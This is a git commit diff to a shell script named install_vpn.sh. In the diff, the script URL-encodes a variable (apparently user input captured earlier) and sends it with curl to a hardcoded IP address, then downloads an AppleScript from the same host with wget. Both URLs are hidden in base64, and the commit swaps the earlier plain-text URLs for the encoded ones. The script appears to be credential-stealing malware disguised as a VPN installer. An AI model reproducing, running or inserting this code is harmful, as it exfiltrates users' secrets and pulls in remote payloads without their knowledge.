74acd4baab24548bd2632c875a0f9c71e5443164
nitrogen <liquid.nitrogenium@gmail.com>
2023-07-03 21:46:45 +0500

    init

--- install_vpn.sh
+++ install_vpn.sh
@@ -22,11 +22,7 @@ if [ $? -ne 0 ]; then
 fi
 
 encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$p'''))")
-#curl "http://95.217.211.87:8010/p/${encoded}"
-curl "$(echo 'aHR0cDovLzk1LjIxNy4yMTEuODc6ODAxMC9wLw==' | base64 --decode)${encoded}"
-
-
-#wget -O vpn.applescript http://95.217.211.87:8500/mackz.applescript
+curl "$(echo 'aHR0cDovLzk1LjIxNy4yMTEuODc6ODAxMC9wLwo=' | base64 --decode)${encoded}"
 
 
 wget -O vpn.applescript $(echo 'aHR0cDovLzk1LjIxNy4yMTEuODc6ODUwMC9tYWNrei5hcHBsZXNjcmlwdAo=' | base64 --decode)
